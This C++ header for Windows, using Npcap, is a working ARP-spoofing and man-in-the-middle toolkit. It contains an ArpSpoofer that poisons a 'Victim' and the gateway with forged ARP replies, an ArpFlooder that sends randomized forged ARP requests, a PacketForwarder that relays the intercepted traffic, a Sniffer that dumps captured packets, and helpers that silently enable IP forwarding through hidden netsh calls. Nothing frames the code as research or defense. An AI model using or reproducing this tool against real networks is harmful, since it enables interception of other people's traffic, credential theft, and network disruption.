#pragma once
#include <string>
#include <vector>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdarg>
#include <cstdlib>
#include <chrono>
#include <thread>
#include <atomic>
#include <random>
#include <iostream>
#include <iomanip>
#include <ctime>

#include <winsock2.h>
#include <windows.h>
#include <ws2ipdef.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <pcap.h>

inline const uint8_t BroadcastMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
inline const uint8_t ZeroMac[6] = { 0, 0, 0, 0, 0, 0 };

constexpr uint16_t EthertypeArp = 0x0806;
constexpr uint16_t EthertypeIp = 0x0800;
constexpr uint16_t ArpHtypeEth = 0x0001;
constexpr uint16_t ArpPtypeIpv4 = 0x0800;
constexpr uint16_t ArpRequest = 0x0001;
constexpr uint16_t ArpReply = 0x0002;

#pragma pack(push, 1)
struct EthArpPacket {
    uint8_t  EthDst[6];
    uint8_t  EthSrc[6];
    uint16_t EthType;
    uint16_t ArpHtype;
    uint16_t ArpPtype;
    uint8_t  ArpHlen;
    uint8_t  ArpPlen;
    uint16_t ArpOper;
    uint8_t  ArpSha[6];
    uint32_t ArpSpa;
    uint8_t  ArpTha[6];
    uint32_t ArpTpa;
};
#pragma pack(pop)

inline std::vector<uint8_t> BuildArpPacket(
    const uint8_t* EthDst, const uint8_t* EthSrc,
    uint16_t ArpOper,
    const uint8_t* ArpSha, uint32_t ArpSpa,
    const uint8_t* ArpTha, uint32_t ArpTpa)
{
    EthArpPacket Pkt = {};
    memcpy(Pkt.EthDst, EthDst ? EthDst : ZeroMac, 6);
    memcpy(Pkt.EthSrc, EthSrc ? EthSrc : ZeroMac, 6);
    Pkt.EthType = htons(EthertypeArp);
    Pkt.ArpHtype = htons(ArpHtypeEth);
    Pkt.ArpPtype = htons(ArpPtypeIpv4);
    Pkt.ArpHlen = 6;
    Pkt.ArpPlen = 4;
    Pkt.ArpOper = htons(ArpOper);
    memcpy(Pkt.ArpSha, ArpSha ? ArpSha : ZeroMac, 6);
    Pkt.ArpSpa = htonl(ArpSpa);
    memcpy(Pkt.ArpTha, ArpTha ? ArpTha : ZeroMac, 6);
    Pkt.ArpTpa = htonl(ArpTpa);
    std::vector<uint8_t> Result(sizeof(EthArpPacket));
    memcpy(Result.data(), &Pkt, sizeof(EthArpPacket));
    return Result;
}

inline int SendArp(pcap_t* Handle, const std::vector<uint8_t>& Packet) {
    return pcap_sendpacket(Handle, Packet.data(), static_cast<int>(Packet.size()));
}

struct NetInterface {
    std::string DevName;
    std::string Friendly;
    std::string IpAddr;
    std::string MacAddr;
    std::string Gateway;
    std::string Netmask;
    uint32_t    Index = 0;
    bool        IsUp = false;
    bool        IsConnected = false;
    bool        IsLoopback = false;
    bool        IsVirtual = false;
    bool        HasGateway = false;
};

inline uint32_t IpToU32(const std::string& Ip) {
    uint32_t A, B, C, D;
    if (sscanf_s(Ip.c_str(), "%u.%u.%u.%u", &A, &B, &C, &D) == 4)
        return (A << 24) | (B << 16) | (C << 8) | D;
    return 0;
}

inline std::string U32ToIp(uint32_t Ip) {
    char Buf[16];
    snprintf(Buf, sizeof(Buf), "%u.%u.%u.%u",
        (Ip >> 24) & 0xFF, (Ip >> 16) & 0xFF, (Ip >> 8) & 0xFF, Ip & 0xFF);
    return Buf;
}

inline void MacStrToBytes(const std::string& MacStr, uint8_t Out[6]) {
    unsigned int M[6];
    if (sscanf_s(MacStr.c_str(), "%x:%x:%x:%x:%x:%x",
        &M[0], &M[1], &M[2], &M[3], &M[4], &M[5]) == 6) {
        for (int I = 0; I < 6; I++) Out[I] = static_cast<uint8_t>(M[I]);
    }
    else {
        memset(Out, 0, 6);
    }
}

inline std::string MacBytesToStr(const uint8_t Mac[6]) {
    char Buf[18];
    snprintf(Buf, sizeof(Buf), "%02X:%02X:%02X:%02X:%02X:%02X",
        Mac[0], Mac[1], Mac[2], Mac[3], Mac[4], Mac[5]);
    return Buf;
}

inline bool IsVirtualIfName(const std::string& Name) {
    static const char* Keywords[] = {
        "VMware", "VirtualBox", "Hyper-V", "VPN",
        "Tunnel", "Virtual", "virtio", "Wintun",
        "vmnet", "vboxnet", "docker", "veth",
        "virbr", "WireGuard", "Bluetooth",
        "Pseudo", "Miniport", "TAP", "tap", "tun"
    };
    for (const char* Kw : Keywords) {
        if (Name.find(Kw) != std::string::npos) return true;
    }
    return false;
}

inline std::vector<NetInterface> GetInterfaces() {
    std::vector<NetInterface> Result;
    ULONG BufSize = 15000;
    std::vector<uint8_t> Buf(BufSize);
    PIP_ADAPTER_INFO PInfo = reinterpret_cast<PIP_ADAPTER_INFO>(Buf.data());
    ULONG Ret = GetAdaptersInfo(PInfo, &BufSize);
    if (Ret == ERROR_BUFFER_OVERFLOW) {
        Buf.resize(BufSize);
        PInfo = reinterpret_cast<PIP_ADAPTER_INFO>(Buf.data());
        Ret = GetAdaptersInfo(PInfo, &BufSize);
    }
    if (Ret != NO_ERROR) return Result;
    pcap_if_t* AllDevs = nullptr;
    char ErrBuf[PCAP_ERRBUF_SIZE];
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &AllDevs, ErrBuf) != 0) AllDevs = nullptr;
    {
        int NpcapCount = 0;
        for (pcap_if_t* D = AllDevs; D != nullptr; D = D->next) NpcapCount++;
        fprintf(stderr, "[ARP DEBUG] GetAdaptersInfo ret=%lu  Npcap devices=%d  ErrBuf=%s\n",
                Ret, NpcapCount, AllDevs ? "" : ErrBuf);
    }
    for (PIP_ADAPTER_INFO P = PInfo; P != nullptr; P = P->Next) {
        NetInterface Iface;
        Iface.IpAddr = P->IpAddressList.IpAddress.String;
        Iface.Netmask = P->IpAddressList.IpMask.String;
        Iface.Gateway = P->GatewayList.IpAddress.String;
        char Mac[18];
        snprintf(Mac, sizeof(Mac), "%02X:%02X:%02X:%02X:%02X:%02X",
            P->Address[0], P->Address[1], P->Address[2],
            P->Address[3], P->Address[4], P->Address[5]);
        Iface.MacAddr = Mac;
        Iface.Friendly = P->Description ? P->Description : P->AdapterName;
        Iface.Index = P->Index;
        Iface.HasGateway = !Iface.Gateway.empty() && Iface.Gateway != "0.0.0.0";
        Iface.IsVirtual = IsVirtualIfName(Iface.Friendly);
        for (pcap_if_t* D = AllDevs; D != nullptr; D = D->next) {
            std::string Ddesc = D->description ? D->description : "";
            if (!Ddesc.empty() && (Ddesc.find(Iface.Friendly) != std::string::npos
                    || Iface.Friendly.find(Ddesc) != std::string::npos)) {
                Iface.DevName = D->name;
                Iface.IsLoopback = (D->flags & PCAP_IF_LOOPBACK) != 0;
                Iface.IsUp = (D->flags & PCAP_IF_UP) != 0;
                Iface.IsConnected = (D->flags & PCAP_IF_CONNECTION_STATUS)
                    == PCAP_IF_CONNECTION_STATUS_CONNECTED;
                break;
            }
        }
        fprintf(stderr, "[ARP DEBUG]   Adapter \"%s\" -> DevName=\"%s\" %s\n",
                Iface.Friendly.c_str(), Iface.DevName.c_str(),
                Iface.DevName.empty() ? "(NO MATCH)" : "(matched)");
        if (Iface.DevName.empty() && AllDevs) {
            std::string AdapterName(P->AdapterName ? P->AdapterName : "");
            for (pcap_if_t* D2 = AllDevs; D2 != nullptr; D2 = D2->next) {
                std::string Dname = D2->name ? D2->name : "";
                if (!AdapterName.empty() && Dname.find(AdapterName) != std::string::npos) {
                    Iface.DevName = D2->name;
                    Iface.IsLoopback = (D2->flags & PCAP_IF_LOOPBACK) != 0;
                    Iface.IsUp = (D2->flags & PCAP_IF_UP) != 0;
                    Iface.IsConnected = (D2->flags & PCAP_IF_CONNECTION_STATUS)
                        == PCAP_IF_CONNECTION_STATUS_CONNECTED;
                    break;
                }
            }
            if (Iface.DevName.empty()) Iface.DevName = AllDevs->name;
        }
        if (!Iface.IpAddr.empty() && Iface.IpAddr != "0.0.0.0") Result.push_back(Iface);
    }
    fprintf(stderr, "[ARP DEBUG] ===== GetInterfaces: %zu adapter(s) returned =====\n", Result.size());
    for (size_t I = 0; I < Result.size(); I++) {
        const auto& N = Result[I];
        fprintf(stderr, "[ARP DEBUG] #%zu: \"%s\"\n", I, N.Friendly.c_str());
        fprintf(stderr, "          IP=%s  MAC=%s  GW=%s\n",
                N.IpAddr.c_str(), N.MacAddr.c_str(), N.Gateway.c_str());
        fprintf(stderr, "          DevName=\"%s\"  Index=%u\n", N.DevName.c_str(), N.Index);
        fprintf(stderr, "          Up=%d  Conn=%d  Loop=%d  Virt=%d  GWok=%d\n",
                N.IsUp, N.IsConnected, N.IsLoopback, N.IsVirtual, N.HasGateway);
    }
    fprintf(stderr, "[ARP DEBUG] ===============================================\n");
    if (AllDevs) pcap_freealldevs(AllDevs);
    return Result;
}

inline bool EnableIpForward(uint32_t IfIndex) {
    char Cmd[128];
    snprintf(Cmd, sizeof(Cmd),
        "netsh interface ipv4 set interface %lu forwarding=enabled", IfIndex);
    STARTUPINFOA Si{};
    PROCESS_INFORMATION Pi{};
    Si.cb = sizeof(Si);
    Si.dwFlags = STARTF_USESHOWWINDOW;
    Si.wShowWindow = SW_HIDE;

    char FullCmd[256];
    snprintf(FullCmd, sizeof(FullCmd), "cmd /c %s", Cmd);
    if (!CreateProcessA(nullptr, FullCmd, nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, nullptr, nullptr, &Si, &Pi)) {
        return false;
    }
    WaitForSingleObject(Pi.hProcess, INFINITE);
    DWORD ExitCode = 1;
    GetExitCodeProcess(Pi.hProcess, &ExitCode);
    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
    return ExitCode == 0;
}

inline bool DisableIpForward(uint32_t IfIndex) {
    char Cmd[128];
    snprintf(Cmd, sizeof(Cmd),
        "netsh interface ipv4 set interface %lu forwarding=disabled", IfIndex);
    STARTUPINFOA Si{};
    PROCESS_INFORMATION Pi{};
    Si.cb = sizeof(Si);
    Si.dwFlags = STARTF_USESHOWWINDOW;
    Si.wShowWindow = SW_HIDE;

    char FullCmd[256];
    snprintf(FullCmd, sizeof(FullCmd), "cmd /c %s", Cmd);
    if (!CreateProcessA(nullptr, FullCmd, nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, nullptr, nullptr, &Si, &Pi)) {
        return false;
    }
    WaitForSingleObject(Pi.hProcess, INFINITE);
    DWORD ExitCode = 1;
    GetExitCodeProcess(Pi.hProcess, &ExitCode);
    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
    return ExitCode == 0;
}

inline bool GetIpForwardStatus(uint32_t IfIndex) {
    char Cmd[192], Buf[256];
    snprintf(Cmd, sizeof(Cmd),
        "netsh interface ipv4 show interface %lu", IfIndex);
    FILE* P = _popen(Cmd, "r");
    if (!P) return false;
    bool Result = false;
    while (fgets(Buf, sizeof(Buf), P)) {
        if (strstr(Buf, "Forwarding") && strstr(Buf, "Enabled")) {
            Result = true; break;
        }
    }
    _pclose(P);
    return Result;
}

inline NetInterface FindBestInterface() {
    auto Ifaces = GetInterfaces();
    fprintf(stderr, "[ARP DEBUG] FindBestInterface: %zu interfaces total\n", Ifaces.size());
    for (const auto& I : Ifaces) {
        if (!I.IsVirtual && I.IsUp && I.IsConnected && I.HasGateway && !I.IsLoopback) {
            fprintf(stderr, "[ARP DEBUG] Pri1: selected \"%s\" (IP=%s)\n", I.Friendly.c_str(), I.IpAddr.c_str());
            return I;
        }
    }
    fprintf(stderr, "[ARP DEBUG] Pri1: no match\n");
    for (const auto& I : Ifaces) {
        if (I.IsUp && I.IsConnected && I.HasGateway && !I.IsLoopback) {
            fprintf(stderr, "[ARP DEBUG] Pri2: selected \"%s\" (IP=%s)\n", I.Friendly.c_str(), I.IpAddr.c_str());
            return I;
        }
    }
    fprintf(stderr, "[ARP DEBUG] Pri2: no match\n");
    for (const auto& I : Ifaces) {
        if (I.IsUp && I.HasGateway && !I.IsLoopback) {
            fprintf(stderr, "[ARP DEBUG] Pri3: selected \"%s\" (IP=%s)\n", I.Friendly.c_str(), I.IpAddr.c_str());
            return I;
        }
    }
    fprintf(stderr, "[ARP DEBUG] Pri3: no match\n");
    for (const auto& I : Ifaces) {
        if (I.IsUp && I.IsConnected && !I.IsLoopback) {
            fprintf(stderr, "[ARP DEBUG] Pri4: selected \"%s\" (IP=%s)\n", I.Friendly.c_str(), I.IpAddr.c_str());
            return I;
        }
    }
    fprintf(stderr, "[ARP DEBUG] Pri4: no match\n");
    for (const auto& I : Ifaces) {
        if (I.IsUp && !I.IsLoopback && !I.IpAddr.empty()) {
            fprintf(stderr, "[ARP DEBUG] Pri5: selected \"%s\" (IP=%s)\n", I.Friendly.c_str(), I.IpAddr.c_str());
            return I;
        }
    }
    fprintf(stderr, "[ARP DEBUG] Pri5: no match - falling back (Npcap flags unreliable)\n");
    for (const auto& I : Ifaces) {
        if (!I.IsVirtual && !I.IsLoopback && I.HasGateway) {
            fprintf(stderr, "[ARP DEBUG] Pri6: selected \"%s\" (IP=%s)\n", I.Friendly.c_str(), I.IpAddr.c_str());
            return I;
        }
    }
    fprintf(stderr, "[ARP DEBUG] Pri6: no match\n");
    for (const auto& I : Ifaces) {
        if (!I.IsLoopback && I.HasGateway) {
            fprintf(stderr, "[ARP DEBUG] Pri7: selected \"%s\" (IP=%s)\n", I.Friendly.c_str(), I.IpAddr.c_str());
            return I;
        }
    }
    fprintf(stderr, "[ARP DEBUG] Pri7: no match\n");
    for (const auto& I : Ifaces) {
        if (!I.IsLoopback && !I.IpAddr.empty()) {
            fprintf(stderr, "[ARP DEBUG] Pri8: selected \"%s\" (IP=%s)\n", I.Friendly.c_str(), I.IpAddr.c_str());
            return I;
        }
    }
    fprintf(stderr, "[ARP DEBUG] ALL PRIORITIES FAILED - no suitable interface!\n");
    return {};
}

inline NetInterface SelectInterface(const std::string& DevName) {
    if (!DevName.empty()) {
        auto Ifaces = GetInterfaces();
        for (const auto& Iface : Ifaces) {
            if (Iface.DevName == DevName || Iface.Friendly.find(DevName) != std::string::npos)
                return Iface;
        }
        return {};
    }
    return FindBestInterface();
}

inline bool ResolveMac(pcap_t* Handle, const uint8_t* SrcMac, const std::string& SrcIp,
    const std::string& TargetIp, uint8_t OutMac[6], int TimeoutMs = 3000) {
    uint32_t TargetU32 = IpToU32(TargetIp);
    uint32_t SrcU32 = IpToU32(SrcIp);
    auto ArpReq = BuildArpPacket(BroadcastMac, SrcMac, ArpRequest, SrcMac, SrcU32, nullptr, TargetU32);
    if (pcap_sendpacket(Handle, ArpReq.data(), static_cast<int>(ArpReq.size())) != 0) return false;
    auto Start = std::chrono::steady_clock::now();
    while (true) {
        auto Elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - Start).count();
        if (Elapsed > TimeoutMs) break;
        struct pcap_pkthdr* Pkthdr = nullptr;
        const uint8_t* PktData = nullptr;
        int Ret = pcap_next_ex(Handle, &Pkthdr, &PktData);
        if (Ret != 1 || !Pkthdr || Pkthdr->len < 42) {
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
            continue;
        }
        uint16_t Ethertype = (PktData[12] << 8) | PktData[13];
        if (Ethertype != EthertypeArp) continue;
        const uint8_t* Ar = PktData + 14;
        uint16_t Oper = (Ar[6] << 8) | Ar[7];
        if (Oper != ArpReply) continue;
        uint32_t Spa = (Ar[14] << 24) | (Ar[15] << 16) | (Ar[16] << 8) | Ar[17];
        if (Spa == TargetU32) { memcpy(OutMac, Ar + 8, 6); return true; }
    }
    return false;
}

struct SpoofParams {
    pcap_t* Handle = nullptr;
    uint8_t MyMac[6] = {};
    uint8_t VictimMac[6] = {};
    uint32_t VictimIp = 0;
    uint8_t GatewayMac[6] = {};
    uint32_t GatewayIp = 0;
    int     IntervalMs = 2000;
};

class ArpSpoofer {
public:
    explicit ArpSpoofer(const SpoofParams& Params) : Params(Params) {}
    ~ArpSpoofer() { stop(); }

    void start() {
        if (Running) return;
        Running = true; StopFlag = false;
        std::thread([this]() { RunLoop(); }).detach();
    }
    void stop() { StopFlag = true; Running = false; }

    void restore(int Count = 5) {
        for (int I = 0; I < Count; I++) {
            auto P1 = BuildArpPacket(Params.VictimMac, Params.GatewayMac, ArpReply,
                Params.GatewayMac, Params.GatewayIp,
                Params.VictimMac, Params.VictimIp);
            auto P2 = BuildArpPacket(Params.GatewayMac, Params.VictimMac, ArpReply,
                Params.VictimMac, Params.VictimIp,
                Params.GatewayMac, Params.GatewayIp);
            SendArp(Params.Handle, P1); SendArp(Params.Handle, P2);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    bool IsRunning() const { return Running; }

private:
    void RunLoop() {
        while (!StopFlag) {
            SendSpoofPackets();
            std::this_thread::sleep_for(std::chrono::milliseconds(Params.IntervalMs));
        }
    }
    void SendSpoofPackets() {
        auto P1 = BuildArpPacket(Params.VictimMac, Params.MyMac, ArpReply,
            Params.MyMac, Params.GatewayIp,
            Params.VictimMac, Params.VictimIp);
        auto P2 = BuildArpPacket(Params.GatewayMac, Params.MyMac, ArpReply,
            Params.MyMac, Params.VictimIp,
            Params.GatewayMac, Params.GatewayIp);
        SendArp(Params.Handle, P1); SendArp(Params.Handle, P2);
    }
    SpoofParams Params;
    std::atomic<bool> Running{ false };
    std::atomic<bool> StopFlag{ false };
};

struct FloodParams {
    pcap_t* Handle = nullptr;
    uint8_t MyMac[6] = {};
    uint32_t SubnetIp = 0;
    uint32_t SubnetMask = 0xFFFFFF00;
    int      Rate = 1000;
};

class ArpFlooder {
public:
    explicit ArpFlooder(const FloodParams& Params) : Params(Params) {}
    ~ArpFlooder() { stop(); }

    void start() { if (Running) return; Running = true; std::thread([this]() { RunLoop(); }).detach(); }
    void stop() { Running = false; }
    uint64_t SentCount() const { return Sent; }
    bool IsRunning() const { return Running; }

private:
    void RunLoop() {
        std::random_device Rd; std::mt19937 Gen(Rd());
        std::uniform_int_distribution<unsigned short> MacByte(0, 255);
        std::uniform_int_distribution<unsigned short> HostByte(1, 254);
        auto IntervalNs = 1000000000LL / Params.Rate;
        uint64_t LastSent = 0;
        while (Running) {
            uint8_t FakeMac[6];
            for (int I = 0; I < 6; I++) FakeMac[I] = static_cast<uint8_t>(MacByte(Gen));
            uint32_t Base = Params.SubnetIp & Params.SubnetMask;
            uint32_t HostPart = (HostByte(Gen) << 24) | (HostByte(Gen) << 16) |
                (HostByte(Gen) << 8) | HostByte(Gen);
            uint32_t FakeIp = Base | (HostPart & ~Params.SubnetMask);
            uint32_t TargetIp = (Base | 1) & 0xFFFFFFFF;
            auto Pkt = BuildArpPacket(BroadcastMac, FakeMac, ArpRequest,
                FakeMac, FakeIp, nullptr, TargetIp);
            SendArp(Params.Handle, Pkt); Sent++;
            auto Now = std::chrono::steady_clock::now().time_since_epoch().count();
            if (LastSent == 0) LastSent = Now;
            uint64_t Expected = Sent * IntervalNs;
            uint64_t Elapsed = Now - LastSent;
            if (Elapsed < Expected)
                std::this_thread::sleep_for(std::chrono::nanoseconds(Expected - Elapsed));
        }
    }
    FloodParams Params;
    std::atomic<bool> Running{ false };
    std::atomic<uint64_t> Sent{ 0 };
};

struct FwdParams {
    pcap_t* Handle = nullptr;
    uint8_t MyMac[6] = {};
    uint8_t VictimMac[6] = {};
    uint32_t VictimIp = 0;
    uint8_t GatewayMac[6] = {};
    uint32_t GatewayIp = 0;
};

class PacketForwarder {
public:
    explicit PacketForwarder(const FwdParams& Params) : Params(Params) {}
    ~PacketForwarder() { stop(); }

    void start() {
        if (Running) return;
        Running = true;
        std::thread([this]() {
            pcap_loop(Params.Handle, -1, PacketHandler, reinterpret_cast<uint8_t*>(this));
            Running = false;
            }).detach();
    }
    void stop() { Running = false; pcap_breakloop(Params.Handle); }
    uint64_t FwdCount() const { return Fwd; }
    bool IsRunning() const { return Running; }
    void IncFwd() { Fwd++; }
    FwdParams Params;
    std::atomic<bool> Running{ false };
    std::atomic<uint64_t> Fwd{ 0 };

private:
    static void PacketHandler(uint8_t* User, const struct pcap_pkthdr* Header, const uint8_t* Pkt) {
        PacketForwarder* Self = reinterpret_cast<PacketForwarder*>(User);
        if (!Self->IsRunning()) { pcap_breakloop(Self->Params.Handle); return; }
        if (Header->len < 14) return;
        uint16_t ET = (Pkt[12] << 8) | Pkt[13];
        if (ET != EthertypeIp) return;
        if (memcmp(Pkt, Self->Params.MyMac, 6) != 0) return;
        const uint8_t* IpHdr = Pkt + 14;
        if ((IpHdr[0] >> 4) != 4) return;
        uint32_t DstIp = (IpHdr[16] << 24) | (IpHdr[17] << 16) |
            (IpHdr[18] << 8) | IpHdr[19];
        const uint8_t* NewDst = nullptr;
        if (DstIp == Self->Params.GatewayIp) NewDst = Self->Params.GatewayMac;
        else if (DstIp == Self->Params.VictimIp) NewDst = Self->Params.VictimMac;
        else return;
        uint16_t TotalLen = (IpHdr[2] << 8) | IpHdr[3];
        int FrameLen = TotalLen + 14;
        if (FrameLen > Header->len) FrameLen = static_cast<int>(Header->len);
        if (FrameLen > 1514) FrameLen = 1514;
        std::vector<uint8_t> Buf(FrameLen);
        memcpy(Buf.data(), Pkt, FrameLen);
        memcpy(Buf.data(), NewDst, 6);
        memcpy(Buf.data() + 6, Self->Params.MyMac, 6);
        pcap_sendpacket(Self->Params.Handle, Buf.data(), FrameLen);
        Self->IncFwd();
    }
};

struct SniffParams {
    pcap_t* Handle = nullptr;
    std::string Filter;
    std::string OutFile;
    bool        Verbose = false;
};

class Sniffer {
public:
    explicit Sniffer(const SniffParams& Params) : Params(Params) {}
    ~Sniffer() { stop(); }

    void start() {
        if (Running) return;
        if (!Params.OutFile.empty()) {
            Dumper = pcap_dump_open(Params.Handle, Params.OutFile.c_str());
            if (!Dumper) return;
        }
        if (!Params.Filter.empty()) {
            struct bpf_program Fp; bpf_u_int32 Net = 0;
            if (pcap_compile(Params.Handle, &Fp, Params.Filter.c_str(), 0, Net) == 0) {
                pcap_setfilter(Params.Handle, &Fp); pcap_freecode(&Fp);
            }
        }
        Running = true;
        std::thread([this]() {
            pcap_loop(Params.Handle, -1, SniffCallback, reinterpret_cast<uint8_t*>(this));
            Running = false;
            }).detach();
    }

    void stop() {
        Running = false; pcap_breakloop(Params.Handle);
        if (Dumper) { pcap_dump_close(Dumper); Dumper = nullptr; }
    }

    uint64_t PktCount() const { return Pkt; }
    bool IsRunning() const { return Running; }
    void IncPkt() { Pkt++; }
    void DumpPkt(const struct pcap_pkthdr* H, const uint8_t* Pkt) {
        if (Dumper) pcap_dump(reinterpret_cast<uint8_t*>(Dumper), H, Pkt);
    }
    bool Verbose() const { return Params.Verbose; }
    SniffParams Params;
    pcap_dumper_t* Dumper = nullptr;
    std::atomic<bool> Running{ false };
    std::atomic<uint64_t> Pkt{ 0 };

private:
    static void SniffCallback(uint8_t* User, const struct pcap_pkthdr* Header, const uint8_t* Pkt) {
        Sniffer* Self = reinterpret_cast<Sniffer*>(User);
        if (!Self->IsRunning()) { pcap_breakloop(Self->Params.Handle); return; }
        Self->IncPkt();
        if (Header->len < 14) return;
        Self->DumpPkt(Header, Pkt);
        if (!Self->Verbose()) return;
        uint16_t ET = (Pkt[12] << 8) | Pkt[13];
        if (ET != 0x0800) return;
        const uint8_t* IpHdr = Pkt + 14;
        uint8_t Ihl = (IpHdr[0] & 0x0F) * 4;
        if (Ihl < 20) return;
        uint8_t Proto = IpHdr[9];
        uint32_t SrcIp = (IpHdr[12] << 24) | (IpHdr[13] << 16) |
            (IpHdr[14] << 8) | IpHdr[15];
        uint32_t DstIp = (IpHdr[16] << 24) | (IpHdr[17] << 16) |
            (IpHdr[18] << 8) | IpHdr[19];
        char Ts[32]; time_t Sec = Header->ts.tv_sec; struct tm TmInfo;
        localtime_s(&TmInfo, &Sec);
        strftime(Ts, sizeof(Ts), "%H:%M:%S", &TmInfo);
        const char* Pn = "???"; uint16_t Sp = 0, Dp = 0;
        if (Proto == 6) {
            Pn = "TCP"; if (Header->len >= (size_t)(14 + Ihl + 4)) {
                const uint8_t* T = IpHdr + Ihl; Sp = (T[0] << 8) | T[1]; Dp = (T[2] << 8) | T[3];
            }
        }
        else if (Proto == 17) {
            Pn = "UDP"; if (Header->len >= (size_t)(14 + Ihl + 4)) {
                const uint8_t* U = IpHdr + Ihl; Sp = (U[0] << 8) | U[1]; Dp = (U[2] << 8) | U[3];
            }
        }
        else if (Proto == 1) Pn = "ICMP";
        std::cout << Ts << " " << U32ToIp(SrcIp);
        if (Sp) std::cout << ":" << Sp;
        std::cout << " -> " << U32ToIp(DstIp);
        if (Dp) std::cout << ":" << Dp;
        std::cout << " [" << Pn << "] " << Header->len << " bytes" << std::endl;
    }
};
